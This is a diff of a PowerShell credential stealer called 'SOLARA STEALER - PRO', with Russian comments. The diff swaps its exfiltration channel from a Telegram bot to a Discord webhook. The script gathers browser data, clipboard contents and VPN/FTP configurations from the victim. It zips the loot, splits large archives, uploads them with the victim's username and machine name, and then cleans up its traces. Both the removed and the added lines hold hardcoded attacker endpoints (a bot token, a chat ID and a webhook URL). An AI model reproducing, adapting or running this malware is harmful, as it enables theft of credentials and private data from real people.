@@ -1,20 +1,18 @@
 # =================================================================================================
 # ||                                                                                             ||
-# ||                                  SOLARA STEALER - PRO                                      ||
+# ||                                  SOLARA STEALER - PRO (Discord)                            ||
 # ||                                                                                             ||
-# ||      Расширенная версия скрипта для сбора данных и отправки в Telegram.                     ||
+# ||      Расширенная версия скрипта для сбора данных и отправки в Discord Webhook.              ||
 # ||                Поддержка расширенного списка браузеров и ПО.                               ||
 # ||                                                                                             ||
 # =================================================================================================
 
 # -------------------------------------------------------------------------------------------------
-# |                                         КОНФИГУРАЦИЯ                                        |
+# |                                         КОНФИГУРАЦИЯ                                         |
 # -------------------------------------------------------------------------------------------------
-
-# --- Конфигурация ---
-$TelegramToken = "8432230669:AAGsKeVpDl9nKqUuHUfciRxrGYdIGQ01b6I"
-$ChatID = "1266539824"
-$MaxPartSize = 49MB  # лимит размера; Telegram допускает до 50 МБ, но лучше 49
+# --- Webhook Discord ---
+$DiscordWebhook   = "https://discord.com/api/webhooks/1433533481236959367/4ZX-0xo9cLOurwO1uY4bbvjeu4921Z8nOLovZ7WRdSrUaX-FVoTNzxruFMqbU2VsMGTG"   # ← сюда свой Discord Webhook URL
+$MaxPartSize      = 24MB                  # лимит размера Discord (~25 МБ, но лучше ставить 24)
 
 # --- Настройки сбора данных ---
 $StealBrowserData      = $true
@@ -44,15 +42,14 @@ $OutputMessages = @{
     Clipboard    = "[+] Копирование данных из буфера обмена..."
     VpnFtp       = "[+] Поиск конфигураций VPN, FTP (FileZilla, WinSCP)..."
     Archiving    = "[+] Архивирование данных..."
-    Sending      = "[+] Отправка архива в Telegram..."
+    Sending      = "[+] Отправка архива в Discord..."
     Cleaning     = "[+] Очистка следов..."
     Complete     = "Процесс завершен."
 }
 
 # -------------------------------------------------------------------------------------------------
-# |                                    ИСПОЛНЯЕМЫЙ КОД                                          |
+# |                                    ИСПОЛНЯЕМЫЙ КОД                                           |
 # -------------------------------------------------------------------------------------------------
-
 function Start-Stealer {
     $LogFolder = "$env:TEMP\Log_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss')"
     if (-not (Test-Path $LogFolder)) {
@@ -108,18 +105,17 @@ function Start-Stealer {
         Compress-Archive -Path "$LogFolder\*" -DestinationPath $ZipPath -Force
 
         Write-Host $OutputMessages.Sending -ForegroundColor Yellow
-        $MaxPartSize = 49MB
         $size = (Get-Item $ZipPath).Length
         if ($size -ge $MaxPartSize) {
             $parts = Split-File -FilePath $ZipPath -MaxBytes $MaxPartSize
             $i = 1
             foreach ($partFile in $parts) {
-                Send-TelegramFile -FilePath $partFile -Caption "Log part $i ($partFile) from $($env:USERNAME) on $($env:COMPUTERNAME)"
+                Send-DiscordFile -FilePath $partFile -Caption "Log part $i ($partFile) from $($env:USERNAME) on $($env:COMPUTERNAME)"
                 Remove-Item $partFile -Force -ErrorAction SilentlyContinue
                 $i++
             }
         } else {
-            Send-TelegramFile -FilePath $ZipPath -Caption "New Log from $($env:USERNAME) on $($env:COMPUTERNAME)"
+            Send-DiscordFile -FilePath $ZipPath -Caption "New Log from $($env:USERNAME) on $($env:COMPUTERNAME)"
         }
     }
     catch {
@@ -139,8 +135,56 @@ function Start-Stealer {
     }
 }
 
+# --- Отправка файла (или части) в Discord ---
+function Send-DiscordFile {
+    param($FilePath, $Caption)
+    $fileName = Split-Path -Leaf $FilePath
+    try {
+        $Form = @{
+            "file" = Get-Item $FilePath
+            "payload_json" = '{"content": "' + $Caption + '"}'
+        }
+        Invoke-RestMethod -Method Post -Uri $DiscordWebhook -Form $Form -TimeoutSec 120
+    } catch {
+        Write-Warning "Failed to send file to Discord: $($_.Exception.Message)"
+    }
+}
 
-# --- Функции сбора данных ---
+# --- Разделение файла на части ---
+function Split-File {
+    param (
+        [string]$FilePath,
+        [int64]$MaxBytes = $MaxPartSize
+    )
+    $buffsize = 8MB
+    $filename = [System.IO.Path]::GetFileNameWithoutExtension($FilePath)
+    $ext = [System.IO.Path]::GetExtension($FilePath)
+    $files = @()
+    $fs = [System.IO.File]::OpenRead($FilePath)
+    $part = 1
+
+    try {
+        while ($fs.Position -lt $fs.Length) {
+            $target = "$($FilePath)_part$part$ext"
+            $partStream = [System.IO.File]::Create($target)
+            $written = 0
+            while (($written -lt $MaxBytes) -and ($fs.Position -lt $fs.Length)) {
+                $toRead = [Math]::Min([Math]::Min($buffsize, ($MaxBytes - $written)), ($fs.Length - $fs.Position))
+                $buffer = New-Object byte[] $toRead
+                $read = $fs.Read($buffer, 0, $toRead)
+                if ($read -gt 0) { $partStream.Write($buffer, 0, $read); $written += $read }
+                else { break }
+            }
+            $partStream.Close()
+            $files += $target
+            $part++
+        }
+    } finally { $fs.Close() }
+    return $files
+}
+
+# --- ФУНКЦИИ СБОРА ДАННЫХ ---
+
 function Get-SystemInformation {
     param($LogPath)
     $SysInfoPath = "$LogPath\SystemInfo.txt"
@@ -387,82 +431,6 @@ function Get-VpnFtpData {
         }
     } catch {}
 }
-
-# --- Отправка файла (или частей) в Telegram ---
-function Send-TelegramFile {
-    param($FilePath, $Caption)
-    $uri = "https://api.telegram.org/bot$TelegramToken/sendDocument"
-    try {
-        $fileContent = [System.IO.File]::ReadAllBytes($FilePath)
-        $fileName = Split-Path -Leaf $FilePath
-
-        $boundary = [System.Guid]::NewGuid().ToString()
-        $body = @()
-        $body += "--$boundary"
-        $body += "Content-Disposition: form-data; name=`"chat_id`""
-        $body += ""
-        $body += $ChatID
-        $body += "--$boundary"
-        $body += "Content-Disposition: form-data; name=`"caption`""
-        $body += ""
-        $body += $Caption
-        $body += "--$boundary"
-        $body += "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`""
-        $body += "Content-Type: application/zip"
-        $body += ""
-
-        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes(($body -join "`r`n"))
-        $boundaryBytes = [System.Text.Encoding]::UTF8.GetBytes("--$boundary--`r`n")
-        $requestBody = New-Object System.IO.MemoryStream
-        $requestBody.Write($bodyBytes, 0, $bodyBytes.Length)
-        $requestBody.Write($fileContent, 0, $fileContent.Length)
-        $requestBody.Write([System.Text.Encoding]::UTF8.GetBytes("`r`n"), 0, 2)
-        $requestBody.Write($boundaryBytes, 0, $boundaryBytes.Length)
-        Invoke-RestMethod -Method Post -Uri $uri `
-            -ContentType "multipart/form-data; boundary=$boundary" `
-            -Body $requestBody.ToArray() `
-            -TimeoutSec 120
-    } catch {
-        Write-Warning "Failed to send file to Telegram: $($_.Exception.Message)"
-    }
-}
-
-# --- Разделение файла на части ---
-# --- Разделение файла на части ---
-function Split-File {
-    param (
-        [string]$FilePath,
-        [int64]$MaxBytes = $MaxPartSize
-    )
-    $buffsize = 8MB
-    $filename = [System.IO.Path]::GetFileNameWithoutExtension($FilePath)
-    $ext = [System.IO.Path]::GetExtension($FilePath)
-    $files = @()
-    $fs = [System.IO.File]::OpenRead($FilePath)
-    $part = 1
-
-    try {
-        while ($fs.Position -lt $fs.Length) {
-            $target = "$($FilePath)_part$part$ext"
-            $partStream = [System.IO.File]::Create($target)
-            $written = 0
-            while (($written -lt $MaxBytes) -and ($fs.Position -lt $fs.Length)) {
-                $toRead = [Math]::Min([Math]::Min($buffsize, ($MaxBytes - $written)), ($fs.Length - $fs.Position))
-                $buffer = New-Object byte[] $toRead
-                $read = $fs.Read($buffer, 0, $toRead)
-                if ($read -gt 0) { $partStream.Write($buffer, 0, $read); $written += $read }
-                else { break }
-            }
-            $partStream.Close()
-            $files += $target
-            $part++
-        }
-    } finally { $fs.Close() }
-    return $files
-}
-
-
-
 
 # --- Запуск основной функции ---
 Start-Stealer
